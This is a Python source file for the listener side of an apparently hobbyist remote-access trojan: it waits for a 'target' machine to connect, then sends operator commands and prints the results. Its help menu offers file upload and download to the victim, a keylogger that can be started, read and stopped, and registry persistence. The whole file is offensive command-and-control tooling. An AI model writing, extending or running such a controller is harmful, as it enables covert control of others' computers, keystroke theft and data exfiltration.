import socket
import termcolor
import json

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


def reliable_rcv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('127.0.0.1', 777))
    print(termcolor.colored("(#) LISTENING FOR INCOMING CONNECTIONS (#)", 'yellow'))
    sock.listen(5)


    target, ip = sock.accept()
    print(termcolor.colored(f"(!) TARGET CONNECTED FROM {ip} (!)", 'green'))
    def target_communication():
        while True:
            command = input(f"(machine: {ip} >")
            reliable_send(command)
            if command == "quit":
                print(termcolor.colored(f"(#) exiting {ip} machine (#)",  'yellow'))
                break
            elif command[:3] == "cd ":
                pass

            elif command == "help":
                print('''
                quit ~ quit section
                upload *file name* ~ upload file to target machine
                download *file name* ~ download file from target machine
                keylogger -s ~ start keylogger
                keylloger -p ~ print inputed keys
                keylogger -stop ~ stop keylogger
                persistence *RegName* *FileName* ~ create register in registry''')
            else:
                result = reliable_rcv()
                print(result)
        
    target_communication()

except KeyboardInterrupt:
    print(termcolor.colored("(#) KeyboardInterrupt (#)", 'red'))
